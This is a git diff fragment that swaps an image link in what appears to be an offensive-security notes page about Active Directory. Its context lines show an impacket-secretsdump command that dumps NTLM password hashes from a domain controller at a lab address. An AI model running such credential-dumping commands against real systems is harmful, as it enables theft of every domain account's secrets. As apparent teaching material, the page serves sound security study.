@@ -40,7 +40,7 @@ If you have credentials for an account that can log on to the DC, it's possible 
 impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
 ```
 
-![](../../.gitbook/assets/image%20%28101%29.png)
+![](../../.gitbook/assets/image%20%28104%29.png)
 
 ## References
 
